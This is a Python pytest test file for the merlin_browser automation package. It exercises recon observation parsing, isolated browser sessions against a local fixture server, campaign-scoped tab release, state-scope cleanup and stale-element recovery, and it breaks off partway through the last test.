from __future__ import annotations

import asyncio
import json
from contextlib import asynccontextmanager, suppress
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace

import httpx
import merlin_browser.service as browser_service_module
import pytest
from merlin_assessments import ReviewedApiTargetTool, StatefulTargetFixtureServer
from merlin_browser import (
    ApiReconHandoff,
    BrowserAction,
    BrowserBoundaryError,
    BrowserBounds,
    BrowserObservation,
    BrowserOwner,
    BrowserService,
    ElementRef,
    OriginDenied,
    StaleReference,
    attach_context,
    launch_isolated,
    launch_persistent,
    restart_isolated,
    restart_persistent,
)
from merlin_browser import (
    browser_tools as _production_browser_tools,
)
from merlin_browser.core import BrowserSession
from merlin_browser.tools import (
    ApiReconHandoffTool,
    BrowserTool,
    _reviewed_cleanup_action,
    _reviewed_latest_setup_action,
    _reviewed_recon_observations,
)
from merlin_contracts import (
    EXECUTABLE_ADAPTER_IDENTITY_VERSION,
    ToolContext,
    executable_adapter_digest,
)
from merlin_storage_postgres import (
    CampaignApiSessionRepository,
    CampaignStore,
    Database,
    DatabaseConfig,
    MigrationRunner,
    SessionRepository,
)
from merlin_tools import ToolBroker


def test_reviewed_recon_observation_attributes_prior_browser_progress() -> None:
    session = SimpleNamespace(
        context_id="browser-context",
        bounds=SimpleNamespace(target_id="target"),
    )
    exchanges = (
        {
            "method": "POST",
            "url": "https://target.test/api/turn",
            "status": 200,
            "observed_at": "2026-10-13T18:31:34+00:00",
            "request_json": {"message": "hello"},
            "response_json": {"result": {"turn": {"score": 85}}},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/turn",
            "status": 200,
            "observed_at": "2026-10-13T18:32:24+00:00",
            "request_json": {"message": "winning turn"},
            "response_json": {
                "result": {"turn": {"score": 100, "outcome": {"kind": "win"}}}
            },
        },
        {
            "method": "POST",
            "url": "https://target.test/api/turn",
            "status": 200,
            "observed_at": "2026-10-13T18:33:09+00:00",
            "request_json": {"message": "next tier"},
            "response_json": {"result": {"turn": {"score": 49}}},
        },
    )
    observations, evidence = _reviewed_recon_observations(
        session,
        [
            {
                "name": "score",
                "role": "score",
                "preferred_direction": "increase",
                "success_values": [100],
                # The reviewed contract named the wrong envelope. The compiler
                # may repair only the unique scalar leaf with the same field name.
                "baseline_selector": {"pointer": "/result/session/score"},
                "result_selector": {"pointer": "/result/session/score"},
            }
        ],
        exchanges,
        method="POST",
        url="https://target.test/api/turn",
    )

    assert len(observations) == 1
    assert observations[0]["baseline"] == 85
    assert observations[0]["result"] == 100
    assert observations[0]["outcome"] == "observed"
    assert observations[0]["success_value_matched"] is True
    assert observations[0]["result_pointer"] == "/result/turn/score"
    assert len(evidence) == 4


class _NativeRequestFixtureRecorder:
    """Give legacy compiler fixtures an explicit typed native-request receipt."""

    def __init__(self, delegate):
        self._delegate = delegate

    def __getattr__(self, name):
        return getattr(self._delegate, name)

    async def reviewed_native_input_receipt(self, context_id, event, input_pointer):
        return {
            "context_id": context_id,
            "target_id": str(event.get("_target_id") or "target"),
            "input_pointer": input_pointer,
            "evidence_ref": "native-request:sha256:" + "e" * 64,
        }


class _StateScopeFixtureStore:
    def __init__(
        self,
        events: list[str] | None = None,
        *,
        enforce_conflicts: bool = False,
    ) -> None:
        self.events = events if events is not None else []
        self.resource_state: str | None = None
        self.resource_limit = 0
        self.checkpoint: dict[str, object] | None = None
        self.envelopes: list[dict[str, object]] = []
        self.fail_claim = False
        self.enforce_conflicts = enforce_conflicts
        self.claims: dict[str, tuple[str, str, str]] = {}
        self.claim_calls: list[dict[str, object]] = []
        self.rekey_calls: list[dict[str, object]] = []
        self.settle_calls: list[dict[str, object]] = []

    def create_state_scope(self, *args, **kwargs):
        self.events.append("created")
        self.envelopes.append(dict(args[2]))
        return {}

    def claim_state_scope_lease(self, *args, **kwargs):
        self.events.append("claimed")
        self.claim_calls.append(dict(kwargs))
        if self.fail_claim:
            return None
        key = (
            str(kwargs["target_authority"]),
            str(kwargs["principal_key"]),
            str(kwargs["equivalence_key"]),
        )
        if self.enforce_conflicts and key in self.claims.values():
            return None
        claim_id = (
            f"claim-browser-fixture-{len(self.claims) + 1}"
            if self.enforce_conflicts
            else "claim-browser-fixture"
        )
        self.claims[claim_id] = key
        return claim_id

    def pause_unclaimed_state_scope(self, *args, **kwargs):
        self.events.append("paused_unclaimed")
        return {}

    def revise_state_scope(self, *args, **kwargs):
        self.events.append("revised")
        return {}

    def acknowledge_state_scope(self, *args, **kwargs):
        self.events.append("acknowledged")
        return {}

    def settle_state_scope(self, *args, **kwargs):
        self.events.append("settled")
        self.settle_calls.append(dict(kwargs))
        return {}

    def pause_state_scope(self, *args, **kwargs):
        self.events.append("paused")
        return {}

    def release_state_scope_lease(self, *args, **kwargs):
        self.events.append("released")
        if args:
            self.claims.pop(str(args[0]), None)
        return True

    def rekey_state_scope_lease(
        self,
        claim_id,
        claimant_id,
        *,
        principal_key,
        equivalence_key,
        maximum_parallel_states=None,
    ):
        current = self.claims.get(str(claim_id))
        if current is None:
            return False
        authority = current[0]
        replacement = (authority, str(principal_key), str(equivalence_key))
        others = {key: value for key, value in self.claims.items() if key != str(claim_id)}
        if self.enforce_conflicts and replacement in others.values():
            return False
        if maximum_parallel_states is not None:
            active = sum(
                value[0] == authority
                and value[1] == str(principal_key)
                and value[2] != "conservative-shared-state"
                for value in others.values()
            )
            if active >= int(maximum_parallel_states):
                return False
        self.events.append("rekeyed")
        self.rekey_calls.append(
            {
                "claimant_id": str(claimant_id),
                "principal_key": str(principal_key),
                "equivalence_key": str(equivalence_key),
                "maximum_parallel_states": maximum_parallel_states,
            }
        )
        self.claims[str(claim_id)] = replacement
        return True

    def resource_status(self, *args, **kwargs):
        if self.resource_state is None:
            return None
        return {
            "state": self.resource_state,
            "available": 0 if self.resource_state == "exhausted" else self.resource_limit,
        }

    def reserve_resource(self, *args, **kwargs):
        self.events.append("resource_reserved")
        self.resource_limit = int(kwargs["limit"])
        if self.resource_state == "exhausted":
            return {"admitted": False, "state": "exhausted", "available": 0}
        self.resource_state = "active"
        return {"admitted": True, "state": "reserved", "available": 0}

    def acknowledge_resource(self, *args, **kwargs):
        self.events.append("resource_acknowledged")
        return {}

    def settle_resource(self, *args, **kwargs):
        self.events.append("resource_settled")
        self.resource_state = "exhausted"
        return {}

    def release_resource(self, *args, **kwargs):
        self.events.append("resource_released")
        return {}

    def record_objective_gate_checkpoint(self, campaign_id, gate_id, **kwargs):
        self.events.append("checkpoint_recorded")
        self.checkpoint = {"campaign_id": campaign_id, "gate_id": gate_id, **kwargs}
        return dict(self.checkpoint)

    def claim_objective_gate_checkpoint_restore(self, campaign_id, gate_id, **kwargs):
        self.events.append("checkpoint_claimed")
        if self.checkpoint is None:
            raise KeyError((campaign_id, gate_id))
        return dict(self.checkpoint)

    def release_objective_gate_checkpoint_restore(self, *args, **kwargs):
        self.events.append("checkpoint_released")
        return True

    def mark_objective_gate_checkpoint_restored(self, *args, **kwargs):
        self.events.append("checkpoint_restored")
        return {}


class _CheckpointVaultFixture:
    def __init__(self) -> None:
        self.secrets: dict[str, str] = {}

    def store_checkpoint(self, secret, *, campaign_id, gate_id):
        reference_id = f"checkpoint:{campaign_id}:{gate_id}"
        self.secrets[reference_id] = secret
        return SimpleNamespace(
            reference_id=reference_id,
            opaque_reference=lambda: {
                "kind": "opaque_reference",
                "namespace": "state",
                "reference_id": reference_id,
            },
            keyed_digest=lambda: {"digest": "sha256:" + "a" * 64},
        )

    def resolve_checkpoint(self, reference_id):
        return self.secrets[reference_id]

    def delete_checkpoint(self, reference_id, *, expected_digest):
        del expected_digest
        return self.secrets.pop(reference_id, None) is not None


def browser_tools(
    resolver,
    recorder=None,
    adapter_resolver=None,
    state_scope_store=None,
    checkpoint_store=None,
    checkpoint_vault=None,
):
    if recorder is not None and not hasattr(recorder, "reviewed_native_input_receipt"):
        recorder = _NativeRequestFixtureRecorder(recorder)
    effective_state_scope_store = state_scope_store
    if effective_state_scope_store is None and adapter_resolver is not None:
        effective_state_scope_store = _StateScopeFixtureStore()
    return _production_browser_tools(
        resolver,
        recorder,
        adapter_resolver,
        effective_state_scope_store,
        checkpoint_store,
        checkpoint_vault,
    )


@pytest.mark.asyncio
async def test_context_json_request_uses_configured_timeout() -> None:
    calls: list[dict[str, object]] = []

    class Response:
        status = 200

        async def text(self) -> str:
            return '{"reply":"ok"}'

    class Request:
        async def fetch(self, url: str, **kwargs: object) -> Response:
            calls.append({"url": url, **kwargs})
            return Response()

    class Context:
        request = Request()

        def on(self, _event: str, _callback: object) -> None:
            return None

    session = BrowserSession(
        Context(),  # type: ignore[arg-type]
        BrowserBounds(target_id="target", allowed_origins={"https://target.test"}),
        BrowserOwner(session_id="s1", worker_id="worker", technique_id="test"),
        mode="isolated",
    )

    status, payload = await session.request_json(
        "POST",
        "https://target.test/message",
        {"message": "hello"},
        timeout_ms=120_000,
    )

    assert (status, payload) == (200, {"reply": "ok"})
    assert calls == [
        {
            "url": "https://target.test/message",
            "method": "POST",
            "data": {"message": "hello"},
            "headers": {},
            "timeout": 120_000,
        }
    ]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("status_code", "body"),
    (
        (400, "plain-text rejection"),
        (503, "<html>temporarily unavailable</html>"),
    ),
)
async def test_context_request_preserves_non_json_http_failure(
    status_code: int,
    body: str,
) -> None:
    class Response:
        status = status_code

        async def text(self) -> str:
            return body

    class Request:
        async def fetch(self, _url: str, **_kwargs: object) -> Response:
            return Response()

    class Context:
        request = Request()

        def on(self, _event: str, _callback: object) -> None:
            return None

    session = BrowserSession(
        Context(),  # type: ignore[arg-type]
        BrowserBounds(target_id="target", allowed_origins={"https://target.test"}),
        BrowserOwner(session_id="s1", worker_id="worker", technique_id="test"),
        mode="isolated",
    )

    assert await session.request_json(
        "POST",
        "https://target.test/message",
        {"message": "hello"},
    ) == (status_code, body)


def reviewed_api_adapter_json(endpoint: str, *, route: str | None = None) -> str:
    value = {
        "interface": "http_api",
        "endpoint": endpoint,
        "authentication": "reviewed browser session",
        "observed_evidence": ["evidence:req", "evidence:res"],
        "session_constraint": "one reviewed session",
        "api_steps": [
            {
                "step_id": "message",
                "endpoint": endpoint,
                "method": "POST",
                "request_template": {"message": "{{input}}"},
                "response_selector": "",
                "success_witness": "reviewed response",
                "expected_status": 200,
                "idempotency_key": None,
                "replay_after_ambiguous_result": False,
                "cleanup": False,
                "interaction": True,
                "captures": {},
                "repeat": 1,
            }
        ],
    }
    if route is not None:
        value["route"] = route
    return json.dumps(value, sort_keys=True, separators=(",", ":"))


def reviewed_browser_adapter(endpoint: str) -> dict[str, object]:
    return {
        "adapter_identity_version": EXECUTABLE_ADAPTER_IDENTITY_VERSION,
        "interface": "browser",
        "endpoint": endpoint,
        "authentication": "reviewed browser session",
        "observed_evidence": ["evidence:pre", "evidence:post"],
        "browser_steps": [
            {
                "step_id": "send",
                "tool": "browser_click",
                "arguments": {"element_ref": "send"},
            }
        ],
        "interaction_contract": {
            "input_locator": "textbox Message",
            "submit_action": "click SEND",
            "frame_context": None,
            "authenticated_session_constraints": "one reviewed browser session",
            "input_limit": {
                "max_characters": 500,
                "source": "dom_attribute",
                "evidence": "maxlength=500",
            },
            "probe": {
                "message": "Please restate the applicable refund policy.",
                "objective_relevance": "establishes the policy baseline",
                "sent_message_witness": "message rendered in transcript",
                "response_witness": "assistant:hello",
            },
            "lifecycle": {
                "current_state": "active chat",
                "terminal_indicator": "not observed during harmless probe",
                "resume_action": "same authenticated page",
                "rating_action": "not exposed during harmless probe",
                "new_session_action": "not used during harmless probe",
                "cleanup_action": "release shared browser actor",
            },
            "success_indicator": "assistant response rendered",
            "evidence_refs": ["evidence:pre", "evidence:post"],
        },
    }


def test_recon_handoff_schema_accepts_explicit_unknown_lifecycle_values() -> None:
    schema = ApiReconHandoffTool(object(), object()).describe().input_schema
    lifecycle = schema["properties"]["reusable_adapter"]["properties"]["interaction_contract"][
        "properties"
    ]["lifecycle"]

    for field in lifecycle["required"]:
        assert lifecycle["properties"][field]["type"] == ["string", "null"]


@pytest.mark.asyncio
async def test_browser_service_prefers_headful_then_falls_back_to_headless(monkeypatch) -> None:
    attempts = []
    fallback = SimpleNamespace(launch_fallback_reason=None)

    async def launch(_bounds, _owner, *, headless):
        attempts.append(headless)
        if not headless:
            raise RuntimeError("display unavailable")
        return fallback

    monkeypatch.setattr(browser_service_module, "launch_isolated", launch)
    service = BrowserService(object(), object())
    result = await service._launch_isolated(  # type: ignore[arg-type]  # noqa: SLF001
        BrowserBounds(target_id="target", allowed_origins={"https://target.test"}),
        BrowserOwner(session_id="s1", worker_id="worker", technique_id="recon"),
    )

    assert result is fallback
    assert attempts == [False, True]
    assert result.launch_fallback_reason == (
        "headful launch failed (RuntimeError); retried headless"
    )


def _fake_persistent_session(released: list[str]) -> SimpleNamespace:
    async def release_actor(actor_id: str) -> None:
        released.append(actor_id)

    return SimpleNamespace(
        mode="persistent",
        context_id="ctx-1",
        bounds=BrowserBounds(target_id="target", allowed_origins={"https://target.test"}),
        owner=BrowserOwner(session_id="s1", worker_id="agent:browser", technique_id="t"),
        release_actor=release_actor,
    )


@pytest.mark.asyncio
async def test_browser_release_is_campaign_scoped_for_shared_authenticated_session() -> None:
    released: list[str] = []
    session = _fake_persistent_session(released)
    tool = BrowserTool("browser_release", lambda _session_id: session)

    rejected = await tool.invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            agent_id="worker-1",
            campaign_id="campaign/1",
        ),
        {},
    )

    assert rejected.is_error is True
    assert rejected.metadata["release_rejected"] is True
    assert rejected.metadata["campaign_scoped"] is True
    assert released == []


@pytest.mark.asyncio
async def test_browser_release_outside_campaign_still_releases_actor() -> None:
    released: list[str] = []
    session = _fake_persistent_session(released)
    tool = BrowserTool("browser_release", lambda _session_id: session)

    released_result = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp", agent_id="worker-1"),
        {},
    )

    assert released_result.is_error is False
    assert released == ["worker-1"]


@pytest.mark.asyncio
async def test_browser_close_tab_is_campaign_scoped_for_shared_authenticated_session() -> None:
    released: list[str] = []
    session = _fake_persistent_session(released)
    tool = BrowserTool("browser_close_tab", lambda _session_id: session)

    rejected = await tool.invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            agent_id="worker-1",
            campaign_id="campaign/1",
        ),
        {"tab_ref": "tab-1"},
    )

    assert rejected.is_error is True
    assert rejected.metadata["release_rejected"] is True
    assert rejected.metadata["campaign_scoped"] is True
    assert released == []


@pytest.mark.asyncio
async def test_browser_close_tab_outside_campaign_still_releases_actor() -> None:
    released: list[str] = []
    session = _fake_persistent_session(released)
    observation = SimpleNamespace(evidence_refs=[], model_dump_json=lambda: "{}")

    async def act(_action, *, actor_id):
        return observation

    session.act = act
    tool = BrowserTool("browser_close_tab", lambda _session_id: session)

    closed = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp", agent_id="worker-1"),
        {"tab_ref": "tab-1"},
    )

    assert closed.is_error is False
    assert released == ["worker-1"]


@pytest.mark.asyncio
async def test_browser_close_tab_records_completed_state_scope_cleanup() -> None:
    released: list[str] = []
    session = _fake_persistent_session(released)
    session.mode = "isolated"
    observation = SimpleNamespace(
        evidence_refs=("browser-evidence:after",),
        model_dump_json=lambda: "{}",
    )

    async def snapshot(_tab_ref, _frame_ref, *, step):
        return SimpleNamespace(
            evidence_refs=("browser-evidence:before",),
            model_dump_json=lambda: json.dumps({"step": step}),
        )

    async def act(_action, *, actor_id):
        return observation

    session.snapshot = snapshot
    session.act = act
    session.metadata = lambda **_kwargs: SimpleNamespace(
        tabs=(SimpleNamespace(tab_ref="tab-1", url="https://target.test/chat"),)
    )
    scope_store = _StateScopeFixtureStore()
    tool = BrowserTool(
        "browser_close_tab",
        lambda _session_id: session,
        state_scope_store=scope_store,
    )

    closed = await tool.invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            agent_id="worker-1",
            campaign_id="campaign/1",
            call_id="close-tab-call",
            technique_attempt_id="attempt/1",
        ),
        {"tab_ref": "tab-1"},
    )

    assert closed.is_error is False
    assert scope_store.settle_calls[-1]["cleanup_disposition"] == "completed"
    assert released == ["worker-1"]


@asynccontextmanager
async def web_fixture(extra_body: bytes = b""):
    async def handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        request = await reader.readuntil(b"\r\n\r\n")
        path = request.split(b" ", 2)[1].decode()
        if path == "/api/message":
            body = b'{"reply":"observed response"}'
            headers = b"Content-Type: application/json\r\n"
        elif path == "/frame":
            body = b'<button aria-label="Frame action">Frame action</button>'
            headers = b"Content-Type: text/html\r\n"
        elif path == "/download":
            body = b"bounded fixture download"
            headers = (
                b"Content-Type: application/octet-stream\r\n"
                b'Content-Disposition: attachment; filename="fixture.txt"\r\n'
            )
        else:
            body = (
                b'<button aria-label="Run check" onclick="this.textContent=\'Done\'">Run</button>'
                b'<a aria-label="Open result" target="_blank" href="/result">result</a>'
                b'<iframe src="/frame"></iframe>' + extra_body
            )
            headers = b"Content-Type: text/html\r\n"
        writer.write(
            b"HTTP/1.1 200 OK\r\n"
            + headers
            + b"Content-Length: "
            + str(len(body)).encode()
            + b"\r\nConnection: close\r\n\r\n"
            + body
        )
        await writer.drain()
        writer.close()

    server = await asyncio.start_server(handler, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    try:
        yield f"http://127.0.0.1:{port}"
    finally:
        server.close()
        await server.wait_closed()


def owner() -> BrowserOwner:
    return BrowserOwner(session_id="s1", worker_id="a1", technique_id="recon")


_CLEANUP_ACTION_AT = datetime(2026, 9, 14, 0, 0, 1, tzinfo=UTC)
_CLEANUP_RESPONSE_AT = _CLEANUP_ACTION_AT + timedelta(seconds=1)
_SETUP_ACTION_AT = _CLEANUP_ACTION_AT - timedelta(seconds=5)
_SETUP_ACTION_REF = "browser-action:sha256:" + "a" * 64


def _strict_creation_events(
    session_id: str, *, active_url: str = "https://target.test/api/active"
) -> tuple[dict[str, object], ...]:
    return (
        {
            "method": "GET",
            "url": active_url,
            "status": 404,
            "request_json": {},
            "response_json": {"error": "no_active_session"},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "status": 200,
            "observed_at": (_SETUP_ACTION_AT + timedelta(seconds=1)).isoformat(),
            "_observation_step": 3,
            "_observation_tab_ref": "tab:setup",
            "trigger_action_ref": _SETUP_ACTION_REF,
            "request_json": {"scenario": "refund"},
            "response_json": {"sessionId": session_id},
        },
        {
            "method": "GET",
            "url": active_url,
            "status": 200,
            "request_json": {},
            "response_json": {"sessionId": session_id},
        },
    )


def _strict_creation_transition(
    *, active_url: str = "https://target.test/api/active"
) -> dict[str, object]:
    return {
        "precondition": {
            "method": "GET",
            "url": active_url,
            "status_codes": [404],
            "pointer": "/error",
            "match_values": ["no_active_session"],
        },
        "postcondition": {
            "method": "GET",
            "url": active_url,
            "status_codes": [200],
            "pointer": "/sessionId",
        },
    }


def _cleanup_action_records(
    *, context_id: str = "browser-context", target_id: str = "target"
) -> tuple[BrowserAction, tuple[BrowserObservation, BrowserObservation], str]:
    action = BrowserAction(
        context_id=context_id,
        target_id=target_id,
        owner=owner(),
        kind="click",
        tab_ref="tab:cleanup",
        frame_ref="main",
        element_ref="tab:cleanup:1:0",
        step=9,
        created_at=_CLEANUP_ACTION_AT,
    )
    evidence_ref = BrowserSession._evidence(action)  # noqa: SLF001
    visible = BrowserObservation(
        context_id=context_id,
        target_id=target_id,
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:cleanup",
        frame_ref="main",
        kind="snapshot",
        step=8,
        elements=(
            ElementRef(
                ref="tab:cleanup:1:0",
                tab_ref="tab:cleanup",
                frame_ref="main",
                role="button",
                name="End reviewed session",
            ),
        ),
        observed_at=_CLEANUP_ACTION_AT - timedelta(seconds=1),
    )
    completed = BrowserObservation(
        context_id=context_id,
        target_id=target_id,
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:cleanup",
        frame_ref="main",
        kind="snapshot",
        step=9,
        evidence_refs=(evidence_ref,),
        observed_at=_CLEANUP_RESPONSE_AT + timedelta(seconds=1),
    )
    return action, (visible, completed), evidence_ref


def _setup_action_records(
    *,
    context_id: str = "browser-context",
    target_id: str = "target",
    tab_ref: str = "tab:setup",
) -> tuple[BrowserAction, tuple[BrowserObservation, BrowserObservation]]:
    action = BrowserAction(
        context_id=context_id,
        target_id=target_id,
        owner=owner(),
        kind="click",
        tab_ref=tab_ref,
        frame_ref="main",
        element_ref=f"{tab_ref}:1:0",
        step=2,
        evidence_refs=(_SETUP_ACTION_REF,),
        created_at=_SETUP_ACTION_AT,
    )
    visible = BrowserObservation(
        context_id=context_id,
        target_id=target_id,
        origin="https://target.test",
        owner=owner(),
        tab_ref=tab_ref,
        frame_ref="main",
        kind="snapshot",
        step=1,
        elements=(
            ElementRef(
                ref=f"{tab_ref}:1:0",
                tab_ref=tab_ref,
                frame_ref="main",
                role="button",
                name="Start reviewed session",
            ),
        ),
        observed_at=_SETUP_ACTION_AT - timedelta(seconds=1),
    )
    completed = BrowserObservation(
        context_id=context_id,
        target_id=target_id,
        origin="https://target.test",
        owner=owner(),
        tab_ref=tab_ref,
        frame_ref="main",
        kind="snapshot",
        step=2,
        evidence_refs=(_SETUP_ACTION_REF,),
        observed_at=_SETUP_ACTION_AT + timedelta(microseconds=1),
    )
    return action, (visible, completed)


@pytest.mark.asyncio
async def test_reviewed_setup_action_ignores_unrelated_zero_step_action_results() -> None:
    setup_ref = "browser-action:sha256:" + "1" * 64
    unrelated_ref = "browser-action:sha256:" + "2" * 64
    setup_action = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="click",
        tab_ref="tab:setup",
        frame_ref="main",
        element_ref="tab:setup:start",
        step=0,
        evidence_refs=(setup_ref,),
        created_at=_SETUP_ACTION_AT,
    )
    unrelated_action = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="click",
        tab_ref="tab:setup",
        frame_ref="main",
        element_ref="tab:setup:unrelated",
        step=0,
        evidence_refs=(unrelated_ref,),
        created_at=_SETUP_ACTION_AT + timedelta(milliseconds=200),
    )
    visible_setup = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:setup",
        frame_ref="main",
        kind="snapshot",
        step=0,
        elements=(
            ElementRef(
                ref="tab:setup:start",
                tab_ref="tab:setup",
                frame_ref="main",
                role="button",
                name="Start reviewed session",
            ),
        ),
        observed_at=_SETUP_ACTION_AT - timedelta(milliseconds=100),
    )
    unrelated_result = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:setup",
        frame_ref="main",
        kind="snapshot",
        step=0,
        evidence_refs=(unrelated_ref,),
        observed_at=_SETUP_ACTION_AT + timedelta(milliseconds=300),
    )

    class Recorder:
        async def list_actions(self, _context_id):
            return setup_action, unrelated_action

        async def list_observations(self, _context_id):
            return visible_setup, unrelated_result

    session = SimpleNamespace(
        context_id="browser-context",
        bounds=SimpleNamespace(target_id="target"),
        owner=owner(),
    )
    reviewed = await _reviewed_latest_setup_action(
        session,
        Recorder(),
        {
            "observed_at": (_SETUP_ACTION_AT + timedelta(seconds=1)).isoformat(),
            "_observation_step": 0,
            "_observation_tab_ref": "tab:setup",
            "trigger_action_ref": setup_ref,
        },
    )

    assert reviewed is not None
    assert reviewed[0] == setup_ref


@pytest.mark.asyncio
async def test_reviewed_setup_action_rejects_exact_zero_step_blocker_result() -> None:
    setup_ref = "browser-action:sha256:" + "3" * 64
    setup_action = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="click",
        tab_ref="tab:setup",
        frame_ref="main",
        element_ref="tab:setup:start",
        step=0,
        evidence_refs=(setup_ref,),
        created_at=_SETUP_ACTION_AT,
    )
    visible_setup = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:setup",
        frame_ref="main",
        kind="snapshot",
        step=0,
        elements=(
            ElementRef(
                ref="tab:setup:start",
                tab_ref="tab:setup",
                frame_ref="main",
                role="button",
                name="Start reviewed session",
            ),
        ),
        observed_at=_SETUP_ACTION_AT - timedelta(milliseconds=100),
    )
    exact_blocker = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:setup",
        frame_ref="main",
        kind="blocker",
        step=0,
        text="setup click was explicitly blocked",
        evidence_refs=(setup_ref,),
        observed_at=_SETUP_ACTION_AT + timedelta(milliseconds=100),
    )

    class Recorder:
        async def list_actions(self, _context_id):
            return (setup_action,)

        async def list_observations(self, _context_id):
            return visible_setup, exact_blocker

    session = SimpleNamespace(
        context_id="browser-context",
        bounds=SimpleNamespace(target_id="target"),
        owner=owner(),
    )
    reviewed = await _reviewed_latest_setup_action(
        session,
        Recorder(),
        {
            "observed_at": (_SETUP_ACTION_AT + timedelta(seconds=1)).isoformat(),
            "_observation_step": 0,
            "_observation_tab_ref": "tab:setup",
            "trigger_action_ref": setup_ref,
        },
    )

    assert reviewed is None


def _interaction_action_records(
    *, context_id: str = "browser-context", target_id: str = "target", tab_ref: str
) -> tuple[tuple[BrowserAction, BrowserAction], tuple[BrowserObservation, BrowserObservation]]:
    fill_ref = "browser-action:sha256:" + "c" * 64
    submit_ref = "browser-action:sha256:" + "d" * 64
    probe_ref = "browser-input-probe:" + "e" * 32
    fill = BrowserAction(
        context_id=context_id,
        target_id=target_id,
        owner=owner(),
        kind="fill",
        tab_ref=tab_ref,
        frame_ref="main",
        element_ref=f"{tab_ref}:message",
        value="[redacted]",
        step=4,
        evidence_refs=(fill_ref, probe_ref),
        redaction_status="redacted",
        created_at=_CLEANUP_ACTION_AT - timedelta(seconds=4),
    )
    submit = BrowserAction(
        context_id=context_id,
        target_id=target_id,
        owner=owner(),
        kind="click",
        tab_ref=tab_ref,
        frame_ref="main",
        element_ref=f"{tab_ref}:send",
        step=5,
        evidence_refs=(submit_ref,),
        created_at=_CLEANUP_ACTION_AT - timedelta(seconds=3),
    )
    observations = tuple(
        BrowserObservation(
            context_id=context_id,
            target_id=target_id,
            origin="https://target.test",
            owner=owner(),
            tab_ref=tab_ref,
            frame_ref="main",
            kind="snapshot",
            step=action.step,
            evidence_refs=action.evidence_refs,
            observed_at=action.created_at + timedelta(microseconds=1),
        )
        for action in (fill, submit)
    )
    return (fill, submit), observations


class _CleanupActionRecorder:
    cleanup_context_id = "browser-context"
    cleanup_target_id = "target"

    async def list_actions(self, context_id):
        cleanup_action, _, _ = _cleanup_action_records(
            context_id=self.cleanup_context_id,
            target_id=self.cleanup_target_id,
        )
        setup_action, _ = _setup_action_records(
            context_id=self.cleanup_context_id,
            target_id=self.cleanup_target_id,
        )
        return (setup_action, cleanup_action) if context_id == self.cleanup_context_id else ()

    async def list_observations(self, context_id):
        _, cleanup_observations, _ = _cleanup_action_records(
            context_id=self.cleanup_context_id,
            target_id=self.cleanup_target_id,
        )
        _, setup_observations = _setup_action_records(
            context_id=self.cleanup_context_id,
            target_id=self.cleanup_target_id,
        )
        return (
            (*setup_observations, *cleanup_observations)
            if context_id == self.cleanup_context_id
            else ()
        )

    async def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
        return {
            "context_id": context_id,
            "target_id": self.cleanup_target_id,
            "input_pointer": input_pointer,
            "evidence_ref": "native-request:sha256:" + "f" * 64,
        }


def action(session, tab_ref, kind, **values):
    return BrowserAction(
        context_id=session.context_id,
        target_id="target",
        owner=owner(),
        tab_ref=tab_ref,
        kind=kind,
        step=values.pop("step", 1),
        **values,
    )


@pytest.mark.asyncio
async def test_isolated_snapshot_stale_recovery_popup_and_frame_bounds() -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            first = await session.snapshot(tab)
            run = next(element for element in first.elements if element.name == "Run check")
            await session.snapshot(tab)  # makes the first generation stale
            await session.act(action(session, tab, "click", element_ref=run.ref))

            link = next(
                element
                for element in (await session.snapshot(tab)).elements
                if element.name == "Open result"
            )
            await session.act(action(session, tab, "click", element_ref=link.ref))
            await asyncio.sleep(0.05)
            assert len(session.metadata().tabs) == 2

            frame_ref = next(ref for ref in session.frame_refs(tab) if ref != "main")
            frame = await session.snapshot(tab, frame_ref)
            assert [element.name for element in frame.elements] == ["Frame action"]
            assert frame.frame_ref == frame_ref

            encoded = session.metadata(restart=True).model_dump_json()
            assert '"state":"restart_required"' in encoded
            assert '"launch_mode":"headless"' in encoded
            assert '"schema_version":"merlin.browser.metadata.v1"' in encoded


@pytest.mark.asyncio
async def test_stale_recovery_preserves_selected_duplicate_label_occurrence() -> None:
    body = b"""
    <button aria-label="Test Wallet"
      onclick="document.getElementById('result').textContent='first'">First</button>
    <button aria-label="Test Wallet"
      onclick="document.getElementById('result').textContent='second'">Second</button>
    <div id="result"></div>
    """
    async with web_fixture(body) as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            first = await session.snapshot(tab)
            duplicate = [element for element in first.elements if element.name == "Test Wallet"]
            assert len(duplicate) == 2

            await session.snapshot(tab)
            await session.act(action(session, tab, "click", element_ref=duplicate[1].ref))

            assert "second" in (await session.snapshot(tab)).text


@pytest.mark.asyncio
async def test_stale_recovery_uses_the_snapshot_rendered_name() -> None:
    body = b"""
    <button style="text-transform: uppercase"
      onclick="document.getElementById('result').textContent='clicked'">Connect wallet</button>
    <div id="result"></div>
    """
    async with web_fixture(body) as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
